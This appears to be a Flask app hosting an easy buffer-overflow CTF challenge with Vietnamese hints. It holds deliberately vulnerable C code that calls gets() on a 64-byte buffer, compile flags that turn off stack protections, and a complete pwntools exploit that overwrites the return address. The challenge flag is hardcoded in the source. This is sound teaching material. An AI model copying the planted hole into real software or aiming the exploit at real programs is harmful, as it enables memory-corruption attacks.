from flask import Flask, request, render_template_string, send_file
import os, io

app = Flask(__name__)
FLAG = os.environ.get("FLAG", "CTF{buff3r_0v3rfl0w_smash_th3_st4ck}")

# Vulnerable C source code để cho sinh viên xem
VULN_SOURCE = '''#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void win() {
    printf("You win! Flag: ''' + FLAG + '''\\n");
}

void vulnerable() {
    char buffer[64];
    printf("Enter your name: ");
    gets(buffer);  // VULNERABLE: no bounds check!
    printf("Hello, %s!\\n", buffer);
}

int main() {
    printf("=== Simple BOF Challenge ===\\n");
    printf("win() is at address: 0x%lx\\n", (long)win);
    vulnerable();
    return 0;
}'''

TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>PWN - Buffer Overflow</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body { font-family: 'Courier New', monospace; background: #0a0010; color: #cc00ff; min-height: 100vh; padding: 40px; }
        .container { max-width: 780px; margin: 0 auto; }
        h1 { color: #cc00ff; font-size: 2rem; margin-bottom: 8px; text-shadow: 0 0 10px #cc00ff; }
        .sub { color: #660088; margin-bottom: 32px; }
        .code-block { background: #0d0d0d; border: 1px solid #440066; padding: 24px; border-radius: 4px; margin-bottom: 24px; overflow-x: auto; }
        .code-block pre { color: #dd88ff; font-size: 0.85rem; line-height: 1.6; white-space: pre-wrap; }
        .vuln-line { background: #330011; color: #ff4444; }
        .hint { background: #0d0d0d; border-left: 3px solid #ffff00; padding: 16px; color: #ffff00; font-size: 0.85rem; line-height: 1.8; margin-bottom: 24px; }
        .info { background: #0d0020; border: 1px solid #440066; padding: 16px; border-radius: 4px; margin-bottom: 24px; line-height: 1.8; font-size: 0.85rem; }
        .step { color: #cc00ff; font-weight: bold; }
        .code { background: #0a0a0a; padding: 8px 12px; border-radius: 3px; color: #00ffcc; display: block; margin: 6px 0; }
        form { display: flex; gap: 12px; margin-top: 16px; }
        input { flex: 1; padding: 12px; background: #0d0d0d; border: 1px solid #cc00ff; color: #cc00ff; font-family: inherit; border-radius: 4px; }
        button { padding: 12px 24px; background: #1a0022; border: 1px solid #cc00ff; color: #cc00ff; font-family: inherit; cursor: pointer; border-radius: 4px; }
        .result { margin-top: 16px; padding: 12px; border-radius: 4px; }
        .success { border: 1px solid #00ff00; color: #00ff00; background: #001100; }
        .error { border: 1px solid #ff0000; color: #ff0000; background: #110000; }
        a { color: #cc00ff; }
    </style>
</head>
<body>
<div class="container">
    <h1>💥 Buffer Overflow</h1>
    <p class="sub">Pwn / Binary Exploitation — BOF [Easy]</p>

    <div class="code-block">
        <pre>{{ source }}</pre>
    </div>

    <div class="hint">
        💡 <strong>Mục tiêu:</strong> Gọi hàm <code>win()</code> mà không gọi trực tiếp trong code!<br>
        Buffer chỉ có 64 bytes nhưng <code>gets()</code> không giới hạn input.<br>
        Overflow buffer → overwrite return address → redirect execution đến <code>win()</code>
    </div>

    <div class="info">
        <div class="step">Bước 1: Compile và phân tích</div>
        <span class="code">gcc -o bof bof.c -fno-stack-protector -no-pie -z execstack</span>
        <span class="code">checksec bof</span>
        <span class="code">nm bof | grep win   # tìm địa chỉ win()</span>
        <br>
        <div class="step">Bước 2: Tìm offset với pwntools</div>
        <span class="code">python3 -c "from pwn import *; print(cyclic(100))" | ./bof</span>
        <span class="code">dmesg | tail   # xem crash address</span>
        <br>
        <div class="step">Bước 3: Exploit</div>
        <span class="code">python3 exploit.py</span>
        <br>
        <div class="step">Template exploit.py:</div>
        <span class="code">from pwn import *<br>
p = process('./bof')<br>
offset = 72  # buffer(64) + saved_rbp(8)<br>
win_addr = 0x401196  # thay bằng địa chỉ thực<br>
payload = b'A' * offset + p64(win_addr)<br>
p.sendline(payload)<br>
p.interactive()</span>
    </div>

    <p style="color:#888;font-size:0.85rem">Sau khi chạy exploit thành công, nhập flag vào đây:</p>
    <form method="POST">
        <input type="text" name="flag" placeholder="CTF{...}" autocomplete="off">
        <button type="submit">Submit</button>
    </form>

    {% if result %}
    <div class="result {{ result_class }}">{{ result }}</div>
    {% endif %}
</div>
</body>
</html>
"""

@app.route("/", methods=["GET", "POST"])
def index():
    result = None
    result_class = None
    if request.method == "POST":
        flag = request.form.get("flag", "").strip()
        if flag == FLAG:
            result = f"🎉 Stack smashed successfully! {FLAG}"
            result_class = "success"
        else:
            result = "❌ Wrong! Keep exploiting..."
            result_class = "error"
    return render_template_string(TEMPLATE, result=result, result_class=result_class, source=VULN_SOURCE)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
